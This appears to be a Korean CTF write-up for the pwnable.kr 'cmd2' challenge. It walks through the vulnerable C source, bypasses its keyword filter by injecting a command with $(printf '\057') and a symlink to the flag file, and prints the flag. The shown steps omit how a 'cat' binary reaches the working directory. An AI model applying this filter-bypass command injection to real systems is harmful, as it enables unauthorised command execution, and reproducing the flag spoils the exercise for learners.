---
layout: post
title: "pwnable.kr - cmd2"
date: 2026-02-24
categories: pwnable.kr pwn
---

# cmd2

> Daddy bought me a system command shell.
> but he put some filters to prevent me from playing with it without his permission...
> but I wanna play anytime I want!

# 문제 개요
* pwnable.kr / Toddler's Bottle
* 9 points
* files: cmd2, cmd2.c, flag

# 프로그램 분석
```c
#include <stdio.h>
#include <string.h>

int filter(char* cmd){
	int r=0;
	r += strstr(cmd, "=")!=0;
	r += strstr(cmd, "PATH")!=0;
	r += strstr(cmd, "export")!=0;
	r += strstr(cmd, "/")!=0;
	r += strstr(cmd, "`")!=0;
	r += strstr(cmd, "flag")!=0;
	return r;
}

extern char** environ;
void delete_env(){
	char** p;
	for(p=environ; *p; p++)	memset(*p, 0, strlen(*p));
}

int main(int argc, char* argv[], char** envp){
	delete_env();
	putenv("PATH=/no_command_execution_until_you_become_a_hacker");
	if(filter(argv[1])) return 0;
	printf("%s\n", argv[1]);
	setregid(getegid(), getegid());
	system( argv[1] );
	return 0;
}
```
`delete_env` 함수를 통해 모든 환경 변수를 초기화하고, `PATH`를 무의미한 경로로 설정하여 기본 명령어 실행을 방해합니다. 또한 `filter` 함수에서 `=`, `PATH`, `export`, `/`, `backtick`, `flag` 문자열을 검사하여 입력을 제한합니다.

# 설계 및 시나리오
`/` 문자가 필터링되어 있으므로 명령어의 절대 경로를 입력할 수 없으며, `PATH`가 망가져 있어 명령어 이름만으로 실행하는 것도 불가능합니다. 이를 우회하기 위해 쉘의 Command Substitution(`$()`)과 `printf`를 활용합니다. `printf`를 통해 `/`의 8진수 코드인 `\057`을 해석하게 함으로써 필터링을 우회하고 실행 경로를 구성할 수 있습니다.

먼저 `/tmp` 하위에 임의의 디렉토리를 생성한 뒤, 필터링 대상인 `flag` 파일에 접근하기 위해 심볼릭 링크를 생성하여 이름을 변경합니다. 이후 `printf`로 생성한 `/` 문자를 조합해 실행 경로를 완성하여 명령어를 실행합니다.

# 익스플로잇
`/tmp` 디렉토리로 이동하여 `flag` 파일을 가리키는 `ddong`이라는 이름의 심볼릭 링크를 생성합니다. 그 후 `$(printf '\057')`가 `/`로 치환되는 점을 이용하여 명령어를 전달합니다.

```bash
cmd2@ubuntu:~$ cd /tmp/aa
cmd2@ubuntu:/tmp/aa$ ln -s /home/cmd2/flag ddong
cmd2@ubuntu:/tmp/aa$ /home/cmd2/cmd2 ".\$(printf '\057')cat ddong"
```

# 결과
```bash
cmd2@ubuntu:/tmp/aa$ /home/cmd2/cmd2 ".\$(printf '\057')cat ddong"
.$(printf '\057')cat ddong
Shell_variables_can_be_quite_fun_to_play_with!